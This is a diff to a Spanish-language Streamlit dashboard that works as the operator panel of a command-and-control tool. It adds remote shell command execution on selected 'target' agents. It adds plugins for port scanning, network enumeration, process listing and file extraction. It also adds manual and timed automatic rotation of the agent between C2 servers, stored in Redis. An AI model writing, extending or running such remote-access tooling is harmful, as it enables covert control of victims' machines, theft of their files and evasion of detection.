@@ -472,67 +472,222 @@ with col2:
             active_agent = st.selectbox("Agente Objetivo:", online_agents, label_visibility="collapsed")
         with col_status:
             agent_data = next(a for a in agents if a['id'] == active_agent)
-            st.metric("CPU", f"{agent_data['cpu_usage']}%", delta=None)
+            srv_name = agent_data.get('server', 'N/A')
+            st.markdown(f"<p style='color:#aaa; font-size:0.85em; margin-top:10px;'>Servidor: <span style='color:{ALIGO_RED};'>{srv_name}</span></p>", unsafe_allow_html=True)
        
         # Tabs
-        tab1, tab2, tab3 = st.tabs(["📝 EJECUTAR COMANDO", "🔌 PLUGINS", "📜 HISTORIAL"])
+        tab1, tab2, tab3, tab4 = st.tabs(["📝 EJECUTAR COMANDO", "🔌 PLUGINS", "� ROTACIÓN", "�📜 HISTORIAL"])
        
+        # =============================================
+        # TAB 1: EJECUTAR COMANDO
+        # =============================================
         with tab1:
             st.write("Ejecuta comandos directamente en el sistema objetivo:")
            
             command = st.text_input(
                 "Shell Command:",
-                placeholder="ej: whoami, ipconfig, sys_info",
-                label_visibility="collapsed"
+                placeholder="ej: whoami, ipconfig, dir",
+                label_visibility="collapsed",
+                key="cmd_input"
             )
            
             col_exec, col_clear = st.columns([0.5, 0.5])
             with col_exec:
                 if st.button("▶ EJECUTAR", key="exec_cmd", use_container_width=True):
                     if command:
-                        with st.spinner("⏳ Enviando al agente..."):
-                            time.sleep(0.7)
+                        with st.spinner("⏳ Enviando comando y esperando respuesta..."):
                             output = server.send_command(active_agent, command)
-                            st.code(output, language="bash")
-                            st.success(f"✅ Ejecutado en {active_agent}")
+                        
+                        # Guardar en historial de sesión
+                        if "cmd_history" not in st.session_state:
+                            st.session_state.cmd_history = []
+                        st.session_state.cmd_history.insert(0, {
+                            "cmd": command,
+                            "output": output,
+                            "agent": active_agent,
+                            "time": datetime.now().strftime("%H:%M:%S")
+                        })
+                        
+                        st.markdown(f"<p style='color:{ALIGO_RED}; font-weight:bold;'>$ {command}</p>", unsafe_allow_html=True)
+                        st.code(output, language="bash")
                     else:
                         st.warning("⚠️ Ingresa un comando válido")
            
             with col_clear:
                 if st.button("🗑️ LIMPIAR", key="clear", use_container_width=True):
+                    if "cmd_history" in st.session_state:
+                        st.session_state.cmd_history = []
                     st.rerun()
-       
+            
+            # Mostrar última salida si existe
+            if "cmd_history" in st.session_state and st.session_state.cmd_history:
+                st.markdown("---")
+                st.markdown(f"<p style='color:#aaa; font-size:0.85em;'>Último comando ejecutado:</p>", unsafe_allow_html=True)
+                last = st.session_state.cmd_history[0]
+                st.markdown(f"<p style='color:{ALIGO_RED};'>$ {last['cmd']} <span style='color:#666; font-size:0.8em;'>({last['time']})</span></p>", unsafe_allow_html=True)
+                st.code(last['output'], language="bash")
+
+        # =============================================
+        # TAB 2: PLUGINS
+        # =============================================
         with tab2:
             st.write("Despliega módulos de diagnóstico avanzado:")
            
+            PLUGINS = {
+                "sysinfo":       "🖥️  SysInfo       - Auditoría de hardware y SO",
+                "portscanner":   "🔍 PortScanner   - Puertos abiertos locales",
+                "network_enum":  "🌐 NetworkEnum   - Interfaces y tabla ARP",
+                "process_list":  "⚙️  ProcessList   - Procesos en ejecución",
+                "file_extractor":"📁 FileExtractor - Logs y archivos de auditoría",
+            }
+            
             col_plugin, col_exec_plugin = st.columns([0.7, 0.3])
             with col_plugin:
-                plugin = st.selectbox(
-                    "Plugin Modular:",
-                    ["sysinfo", "portscanner", "network_enum", "process_list", "file_extractor"],
+                plugin_key = st.selectbox(
+                    "Plugin:",
+                    list(PLUGINS.keys()),
+                    format_func=lambda x: PLUGINS[x],
                     label_visibility="collapsed"
                 )
            
             with col_exec_plugin:
-                if st.button("▶ DESPLEGAR", key="deploy", use_container_width=True):
-                    with st.spinner("Desplegando..."):
-                        time.sleep(1)
-                        output = server.run_plugin(active_agent, plugin)
-                        st.code(output, language="bash")
-                        st.success(f"✅ Plugin '{plugin}' activo")
-       
+                deploy_btn = st.button("▶ DESPLEGAR", key="deploy", use_container_width=True)
+            
+            if deploy_btn:
+                with st.spinner(f"⏳ Ejecutando {plugin_key} en {active_agent}..."):
+                    # Enviar plugin como comando especial
+                    output = server.send_command(active_agent, f"__plugin__{plugin_key}")
+                
+                if "cmd_history" not in st.session_state:
+                    st.session_state.cmd_history = []
+                st.session_state.cmd_history.insert(0, {
+                    "cmd": f"[plugin] {plugin_key}",
+                    "output": output,
+                    "agent": active_agent,
+                    "time": datetime.now().strftime("%H:%M:%S")
+                })
+                
+                st.markdown(f"<p style='color:{ALIGO_RED}; font-weight:bold;'>🔌 Plugin: {plugin_key}</p>", unsafe_allow_html=True)
+                st.code(output, language="bash")
+                st.success(f"✅ Plugin '{plugin_key}' ejecutado en {active_agent}")
+
+        # =============================================
+        # TAB 3: ROTACIÓN DE SERVIDOR
+        # =============================================
         with tab3:
+            st.markdown(f"<h4 style='color:{ALIGO_RED};'>🔄 Rotación de Servidor C2</h4>", unsafe_allow_html=True)
+            st.write("Cambia la conexión del agente a otro servidor disponible.")
+            
+            # Ver servidores disponibles
+            servers_list = server.get_servers_from_redis()
+            agent_server = agent_data.get('server', 'N/A')
+            
+            st.markdown(f"**Servidor actual del agente:** `{agent_server}`")
+            
+            if servers_list:
+                other_servers = [s['name'] for s in servers_list if s['name'] != agent_server]
+                
+                if other_servers:
+                    col_srv, col_rotate = st.columns([0.6, 0.4])
+                    with col_srv:
+                        target_srv = st.selectbox(
+                            "Servidor destino:",
+                            other_servers,
+                            label_visibility="collapsed"
+                        )
+                    with col_rotate:
+                        if st.button("🔄 ROTAR AHORA", key="rotate_now", use_container_width=True):
+                            with st.spinner(f"⏳ Rotando agente a {target_srv}..."):
+                                output = server.send_command(
+                                    active_agent,
+                                    f"__plugin__rotate_server {target_srv}"
+                                )
+                            st.code(output, language="bash")
+                            st.success(f"✅ Comando de rotación enviado → {target_srv}")
+                            time.sleep(3)
+                            st.rerun()
+                else:
+                    st.info("ℹ️ Solo hay un servidor disponible. El agente ya está conectado a él.")
+            
+            st.markdown("---")
+            
+            # Rotación automática cada 90 minutos
+            st.markdown(f"<h4 style='color:{ALIGO_RED};'>⏱️ Rotación Automática</h4>", unsafe_allow_html=True)
+            
+            # Ver estado de rotación automática en Redis
+            auto_rotation = False
+            rotation_interval = 90
+            
+            if redis_client:
+                auto_val = redis_client.get("config:auto_rotation")
+                auto_rotation = auto_val == "1"
+                interval_val = redis_client.get("config:rotation_interval")
+                if interval_val and interval_val.isdigit():
+                    rotation_interval = int(interval_val)
+                
+                # Ver última rotación
+                last_rotation = redis_client.get("agent:last_rotation")
+            
+            col_auto1, col_auto2 = st.columns([0.5, 0.5])
+            with col_auto1:
+                new_interval = st.number_input(
+                    "Intervalo (minutos):",
+                    min_value=5,
+                    max_value=480,
+                    value=rotation_interval,
+                    step=5
+                )
+            with col_auto2:
+                status_label = "🟢 ACTIVA" if auto_rotation else "🔴 INACTIVA"
+                st.markdown(f"<p style='margin-top:30px;'>Estado: <b>{status_label}</b></p>", unsafe_allow_html=True)
+            
+            col_on, col_off = st.columns([0.5, 0.5])
+            with col_on:
+                if st.button("✅ ACTIVAR", key="auto_on", use_container_width=True):
+                    if redis_client:
+                        redis_client.set("config:auto_rotation", "1")
+                        redis_client.set("config:rotation_interval", str(new_interval))
+                        redis_client.set("config:rotation_agent", active_agent)
+                        st.success(f"✅ Rotación automática activada: cada {new_interval} min")
+                        st.rerun()
+            with col_off:
+                if st.button("❌ DESACTIVAR", key="auto_off", use_container_width=True):
+                    if redis_client:
+                        redis_client.set("config:auto_rotation", "0")
+                        st.warning("⛔ Rotación automática desactivada")
+                        st.rerun()
+            
+            # Mostrar última rotación
+            if redis_client and last_rotation:
+                try:
+                    import json as json_lib
+                    rot_data = json_lib.loads(last_rotation)
+                    st.markdown(f"""
+                    <div class='metric-card' style='margin-top:15px;'>
+                        <p style='color:#aaa; font-size:0.85em; margin:0;'>Última rotación:</p>
+                        <p style='margin:5px 0;'>
+                            <span style='color:{ALIGO_RED};'>{rot_data.get('from','?')}</span>
+                            → 
+                            <span style='color:#00ff00;'>{rot_data.get('to','?')}</span>
+                        </p>
+                        <p style='color:#666; font-size:0.8em; margin:0;'>{rot_data.get('timestamp','')}</p>
+                    </div>
+                    """, unsafe_allow_html=True)
+                except Exception:
+                    pass
+
+        # =============================================
+        # TAB 4: HISTORIAL
+        # =============================================
+        with tab4:
             st.write("Últimas operaciones ejecutadas:")
-           
-            if server.command_history:
-                for cmd in server.command_history[:10]:
-                    col_time, col_agent, col_cmd = st.columns([0.2, 0.3, 0.5])
-                    with col_time:
-                        st.caption(cmd['timestamp'].strftime("%H:%M:%S"))
-                    with col_agent:
-                        st.caption(cmd['agent'])
-                    with col_cmd:
-                        st.code(cmd['cmd'], language="bash")
+            
+            if "cmd_history" in st.session_state and st.session_state.cmd_history:
+                for entry in st.session_state.cmd_history[:15]:
+                    with st.expander(f"[{entry['time']}] {entry['agent']} → {entry['cmd'][:50]}"):
+                        st.code(entry['output'], language="bash")
+            else:
+                st.info("No hay comandos ejecutados en esta sesión.")
     else:
         st.error("❌ Sin agentes online — no hay objetivos disponibles")
 
